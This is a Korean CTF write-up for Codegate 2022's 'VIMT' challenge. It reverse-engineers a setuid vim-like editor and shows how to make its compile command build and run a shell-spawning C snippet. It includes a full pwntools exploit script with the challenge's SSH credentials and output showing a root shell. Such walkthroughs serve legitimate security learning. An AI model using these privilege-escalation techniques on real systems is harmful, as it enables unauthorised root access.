---
title: "[Codegate CTF 2022] VIMT"
date: 2022-07-05 22:33:02
tags:
categories: [Security, CTF]
---

## 개요

> Monkeys help you

[<i class="fa-solid fa-file"></i> chall.zip](/uploads/codegate22-vimt/chall.zip)


## 문제 분석

64비트 x86_64 바이너리 `app` 과 `Dockerfile` 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다.

```bash
$ checksec app
[*] '/home/user/study/ctf/codegate22/vimt/app'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`Dockerfile` 을 살펴보면 서버에서 바이너리에 setuid 권한을 부여하고 있으며, SSH 접속 가능한 계정과 비밀번호를 제공합니다. 따라서 주어진 바이너리를 통하여 root 권한의 셸을 획득하는 것이 목표임을 추측할 수 있습니다.

```Dockerfile
# ...
RUN echo "/home/ctf/app" > /home/ctf/.bash_profile
RUN echo "exit" >> /home/ctf/.bash_profile

RUN chown root:root /home/ctf/app
RUN chown root:root /home/ctf/tmp
RUN chmod 640 /home/ctf/app
RUN chmod +x /home/ctf/app
RUN chmod u+s /home/ctf/app
# ...
RUN echo 'ctf:ctf1234_smiley' | chpasswd
RUN chsh -s /bin/bash ctf
```

바이너리를 실행하면 문제의 이름처럼 Vim 에디터와 유사한 화면을 출력하는데, "hello world" 문자열을 입력했더니 각 문자 뒤에 쓰레기 값을 덧붙입니다.

![1.png](/images/codegate22-vimt/1.png)

`main` 함수에서 핵심적인 부분만 살펴보면 다음과 같습니다. 7행에서 `init` 함수를 호출하여 각종 전역 변수를 설정합니다. 15행에서 `getch` 함수로 문자를 입력받아 switch-case 구문에 넘깁니다. 문자가 Backspace인 경우 `deleteKey` 함수를 호출하고, 일반 문자의 경우 `inputKey` 함수를 호출하여 처리합니다. 문자가 Esc인 경우 Vim의 명령 모드(command mode)와 같이 `cmd` 에 추가적으로 커맨드를 입력받고, 52행부터 해당하는 커맨드의 함수를 호출합니다.

```c
int __cdecl __noreturn main()
{
  // ...
  cmd = (char *)calloc(1uLL, 256uLL);
  v4 = 0;
  v3 = 0;
  init();
  setuid(0);
  while ( 1 )
  {
    // ...
              while ( !v3 )
              {
                draw();
                c = getch();
                switch ( c )
                {
                  case 0x1B:                    // Esc
                                                // switch to command mode
                    v3 = 1;
                    printf("\n:");
                    break;
                  case 0x7F:                    // Backspace
                    if ( deleteKey() == -1 )
                      v3 = 2;
                    break;
                  case 0xA:
                    if ( cur_y < y )
                    {
                      ++cur_y;
                      cur_x = 0;
                    }
                    break;
                  default:
                    if ( inputKey(c) == -1 )
                      v3 = 2;
                    break;
                }
              }
              // ...
              _c = getch();
              if ( _c == '\n' )
                break;
              if ( v4 < 255 )
              {
                v0 = v4++;
                cmd[v0] = _c;
                printf("%c", _c);
              }
            }
      // ...
      if ( !strncmp("set", cmd, 3uLL) )
        break;
      // ...
      else if ( !strncmp("compile", cmd, 7uLL) )
      {
        if ( compile() != -1 )
          memset(cmd, 0, 0x100uLL);
        v3 = 2;
      }
    // ...
    if ( setAxis(cmd) != -1 )
      goto LABEL_45;
    v3 = 2;
  }
}
```

`init` 함수는 6행에서 ioctl 시스템 콜을 호출하고, 결과를 전역 변수 `x` 와 `y` 에 대입합니다. `/usr/include/asm-generic/ioctls.h` 파일을 참고하면 요청 번호 `0x5413` 은 `TIOCGWINSZ` 로, 현재 터미널의 가로와 세로 크기를 구하는 요청입니다. 10행에서 터미널의 크기를 바탕으로 문자를 입력받을 2차원 배열 `map` 을 할당합니다. 16행에서는 각종 값으로 생성한 난수를 이용해 `rand` 함수의 seed를 초기화하고 있습니다.

```c
void __fastcall init()
{
  // ...
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  ioctl(1, 0x5413uLL, &sz);                     // ioctl(1, TIOCGWINSZ, &sz)
  x = sz.ws_col;
  y = sz.ws_row - 2;
  // ...
  map = (char **)calloc(1uLL, 8LL * (y + 1));
  for ( i = 0; i < y; ++i )
    map[i] = (char *)calloc(1uLL, x + 1);
  v3 = clock();
  v2 = time(0LL);
  v0 = getpid();
  seed = mix(v3, v2, v0);
  srand(seed);
}
```

`inputKey` 함수는 일반적인 문자 입력을 처리하는 함수입니다. `cur_x` , `cur_y` 는 현재 커서가 위치한 좌표를 나타내는 전역 변수로, 10행은 커서가 터미널의 가로 길이 끝까지 간 경우 줄바꿈하는 코드입니다. 19행에서 입력받은 문자를 2차원 배열 `map` 상에서 커서의 위치에 대입합니다. 20행의 반복문을 보면 문자 뒤로 랜덤한 5개의 문자를 추가하고 있는데, 이 부분의 코드가 원하는 문자열을 그대로 입력할 수 없었던 원인입니다.

```c
int __fastcall inputKey(char c)
{
  char *row; // rcx
  int xpos; // esi
  char random_byte; // di
  char *_row; // rsi
  int _xpos; // ecx
  int i; // [rsp+8h] [rbp-8h]

  if ( cur_x >= x )
  {
    cur_x = 0;
    ++cur_y;
  }
  if ( cur_y >= y )
    cur_y = y - 1;
  row = map[cur_y];
  xpos = cur_x++;
  row[xpos] = c;
  for ( i = 0; i < 5; ++i )
  {
    if ( cur_x >= x )
    {
      cur_x = 0;
      ++cur_y;
    }
    if ( cur_y >= y )
      cur_y = y - 1;
    random_byte = ascii[rand() % 86];
    _row = map[cur_y];
    _xpos = cur_x++;
    _row[_xpos] = random_byte;
  }
  return 0;
}
```

`deleteKey` 함수는 Backspace 입력을 처리하는 함수입니다. Backspace를 한 번 입력할 때마다 반복문을 통해 현재 커서 위치에서 6개의 문자를 지웁니다.

```c
int __fastcall deleteKey()
{
  char *row; // rax
  int i; // [rsp+0h] [rbp-Ch]

  for ( i = 0; i <= 5; ++i )
  {
    if ( cur_x < 0 )
    {
      cur_x = 0;
      --cur_y;
    }
    if ( cur_y < 0 )
    {
      cur_y = 0;
      return -1;
    }
    row = map[cur_y];
    row[--cur_x] = 0;
  }
  return 0;
}
```

`setAxis` 함수는 Esc 입력 후 "set y \<N\>" 커맨드를 처리하는 함수입니다. 21행에서 `cur_y` 전역 변수에 커맨드 매개변수로 전달된 정수 N을 대입합니다. 예를 들어 Esc 입력 후 "set y 0"을 입력하면, 커서의 세로축 위치가 첫 번째 줄로 이동합니다.

```c
int __fastcall setAxis(char *cmd)
{
  size_t len; // rax
  size_t _len; // rax
  int n; // [rsp+1Ch] [rbp-24h]
  char *s; // [rsp+20h] [rbp-20h]
  char v6; // [rsp+2Fh] [rbp-11h]

  if ( strlen(cmd) <= 6 )
    return -1;
  len = strlen(cmd);
  s = (char *)calloc(1uLL, len - 6 + 1);
  v6 = cmd[4];
  _len = strlen(cmd);
  memcpy(s, cmd + 6, _len - 6);
  n = atoi(s);
  if ( v6 != 'y' && v6 != 'Y' )
    goto LABEL_8;
  if ( n >= 0 && n <= y - 1 )
  {
    cur_y = n;
LABEL_8:
    free(s);
    return 0;
  }
  return -1;
}
```

`compile` 함수는 Esc 입력 후 "compile" 커맨드를 처리하는 함수입니다. 17~25행에서 `map` 의 내용을 `tmp/` 경로에 `.c` 확장자를 가진 파일로 저장합니다. 30행에서 `system` 함수를 호출하여 `gcc` 를 실행해 저장한 파일을 바이너리로 컴파일하고, 32행에서 성공하면 컴파일된 바이너리를 다시 `system` 함수로 실행합니다.

```c
int __fastcall compile()
{
  // ...
  _map = (char *)calloc(1uLL, (y + 1) * (x + 1) + 1);
  idx = 0;
  for ( i = 0; i < y; ++i )
  {
    for ( j = 0; j < x; ++j )
    {
      _map[idx] = map[i][j];
      // ...
    }
  }
  hexstring = randomHexString(32);
  hexstring_len = strlen(hexstring);
  c_file = (char *)calloc(1uLL, hexstring_len + 7);
  sprintf(c_file, "tmp/%s.c", hexstring);
  v1 = strlen(hexstring);
  exec_file = (char *)calloc(1uLL, v1 + 7);
  sprintf(exec_file, "tmp/%s", hexstring);
  fd = open(c_file, 0x42, 420LL);
  if ( fd < 0 )
    return -1;
  v2 = strlen(_map);
  write(fd, _map, v2);
  close(fd);
  v5 = strlen(c_file);
  v3 = strlen(exec_file);
  cmd = (char *)calloc(1uLL, v3 + v5 + 9);
  sprintf(cmd, "gcc -o %s %s", exec_file, c_file);
  system(cmd);
  if ( !access(exec_file, 0) )
    system(exec_file);
  // ...
```


## 문제 풀이

문제 바이너리에 setuid 권한이 있으므로, 셸을 실행하는 C 소스 코드를 입력한 후 "compile" 커맨드로 컴파일하여 실행하면 root 권한의 셸을 얻을 수 있습니다. 다만  문자를 입력할 때마다 랜덤한 문자 5개가 함께 입력된다는 문제가 있는데, 터미널의 크기를 잘 조정하고 "set y \<N\>" 커맨드를 적절히 사용하면 원하는 문자열만 입력되도록 할 수 있습니다.

예를 들어 터미널의 가로 크기가 47일 때, "main()" 문자열을 입력해 보겠습니다. 먼저 첫 번째 문자인 'm' 을 입력한 후 `map` 배열의 상태를 살펴보겠습니다. 초록색 문자는 입력한 문자, 흰색 문자는 랜덤으로 입력된 문자, 두꺼운 수직 바는 입력 후 커서의 위치를 나타냅니다. 입력한 'm' 은 배열의 `map[0][0]` 에 저장됩니다.

![2.png](/images/codegate22-vimt/2.png)

'm' 을 한번 더 입력해 보겠습니다. 이전의 입력에서 추가된 랜덤한 5바이트의 문자열로 인해, 이번 'm' 은 배열의 `map[0][6]` 에 저장됩니다.

![3.png](/images/codegate22-vimt/3.png)

이와 같이 'm' 을 모두 8번 입력해 보겠습니다. 8번째로 입력한 'm' 은 `map[0][42]` 에 저장됩니다. 이후 랜덤한 문자열이 추가되는데, 줄바꿈이 일어나 최종적으로 입력 후 커서의 위치가 `map[1][1]` 이 된 것을 확인할 수 있습니다.

![4.png](/images/codegate22-vimt/4.png)

이 상태에서 "set y 0" 커맨드를 실행하면, `cur_y` 전역 변수의 값만 0으로 바뀌면서 커서의 위치가 `map[0][1]` 로 이동합니다. 

![5.png](/images/codegate22-vimt/5.png)

따라서 입력할 문자열의 두 번째 문자인 'a' 를 입력하면, 의도했던 대로 'ma' 를 입력할 수 있게 됩니다. 즉, 각 문자를 입력할 때마다 8번씩 입력한 후 "set y 0" 을 실행하면 모든 문자를 의도한 위치에 입력할 수 있습니다.

![6.png](/images/codegate22-vimt/6.png)

이 방법을 사용하여 코드를 작성하기 위해서는 전체 코드에 줄바꿈이 없어야 하고, 코드의 길이가 터미널의 가로 크기인 47바이트보다 짧아야 합니다. 코드의 길이를 줄이기 위해 다음과 같은 `gcc` 의 트릭을 사용할 수 있습니다.

1. 함수 리턴 타입을 명시하지 않으면 기본값으로 `int` 를 반환합니다.
2. 라이브러리 함수의 헤더를 `#include` 하지 않아도, 링킹 과정에서 동일한 프로토타입의 함수를 resolve하여 호출할 수 있도록 합니다.

[@preview](https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include)

다음은 위의 트릭을 사용하여 작성한 셸을 실행하는 41바이트의 C 코드입니다. 

```c
main() {setuid(0);execve("/bin/sh",0,0);}
```

이 코드를 앞서 사용한 8번 입력 후 "set y 0" 커맨드를 실행하는 방법으로 입력한 후 `map` 배열의 상태는 다음과 같습니다. 커서는 `map[0][41]` 에 위치하고 있으며, `map[0]` 의 코드 뒷부분, `map[1]` 에 거쳐 랜덤한 문자들이 많이 남아있는 상황입니다.

![7.png](/images/codegate22-vimt/7.png)

그런데 코드의 길이가 정확히 41바이트이므로, 현재 커서 위치에서 아무 문자 하나를 입력한 후(실제로는 6개가 입력됩니다) Backspace를 입력하여 `deleteKey` 함수를 호출하면 `map[0]` 의 뒷부분에 위치한 랜덤한 문자는 모두 지울 수 있습니다.

다음 그림에서 붉은 문자는 입력 후 Backspace에 지워지는 문자들입니다. `inputKey` 함수에서 줄바꿈은 새로운 문자를 입력받기 전 이전 입력에 대한 `cur_x` 값의 변화를 기준으로 수행합니다. `inputKey` 함수가 리턴한 이후 `deleteKey` 함수 호출 시점에서 커서의 위치는 줄바꿈이 아직 일어나지 않은 `map[0][47]` 이므로, 랜덤한 문자만 깔끔하게 지울 수 있게 됩니다.

![8.png](/images/codegate22-vimt/8.png)

이후 "set y 1" 커맨드로 커서의 위치를 `map[1][41]` 로 옮긴 후, 동일하게 아무 문자 하나를 입력하고 Backspace를 8번 입력하면 `map[1]` 의 모든 문자를 지울 수 있습니다. 이제 의도했던 대로 정확히 소스 코드만 입력되었습니다. "compile" 커맨드로 바이너리를 컴파일한 후 실행하면 root 권한의 셸을 획득하게 됩니다.

![9.png](/images/codegate22-vimt/9.png)

다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 4행은 `sshpass` 커맨드로 SSH 접속을 수행하고, 35행은 서버에서 `stty` 커맨드로 가상 터미널의 가로와 세로 크기를 지정합니다. 입력할 코드를 전송하는 과정에서 순서가 꼬여 실패하는 경우가 있는데, 익스플로잇 코드를 몇 번 실행하면 root 권한의 셸을 획득할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *

r = process("sshpass -e ssh -tt ctf@localhost -p 1234 'bash -i'",
            shell=True, env={"SSHPASS": "ctf1234_smiley"})
context.log_level = "debug"

def set_axis(n):
    r.send(b"\x1b")
    r.sendline(b"set y " + str(n).encode())


def input_key(c):
    for i in range(8):
        r.send(p8(c))
    set_axis(0)


def clean():
    set_axis(0)
    r.send(b"a")
    r.send(b"\x7f")
    set_axis(1)
    r.send(b"a")
    for i in range(8):
        r.send(b"\x7f")


def compile():
    r.send(b"\x1b")
    r.sendline(b"compile")


def main():
    r.sendlineafter(b"~$", b"stty cols 47 rows 4")
    r.sendlineafter(b"~$", b"./app")

    payload = b"main() {setuid(0);execve(\"/bin/sh\",0,0);}"
    for c in payload:
        input_key(c)

    clean()
    compile()

    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
$ ./ex.py
# ...
    b'-----------------------------------------------main() {setuid(0);execve("/bin/sh",0,0);}      \r\n'
    b'                                               \r\n'
    b'-----------------------------------------------\r\n'
    b":compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to 'int' [-Wimplicit-int]\r\n"
    b'    1 | main() {setuid(0);execve("/bin/sh",0,0);}\r\n'
    b'      | ^~~~\r\n'
    b"tmp/c7fd17d084a218713d385deb3df85bd1.c: In function 'main':\r\n"
    b"tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]\r\n"
    b'    1 | main() {setuid(0);execve("/bin/sh",0,0);}\r\n'
    b'      |         ^~~~~~\r\n'
    b"tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function 'execve' [-Wimplicit-function-declaration]\r\n"
    b'    1 | main() {setuid(0);execve("/bin/sh",0,0);}\r\n'
    b'      |                   ^~~~~~\r\n'
    b'# '
# ...
# $ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x4 bytes:
    b'id\r\n'

[DEBUG] Received 0x2c bytes:
    b'uid=0(root) gid=1000(ctf) groups=1000(ctf)\r\n'
```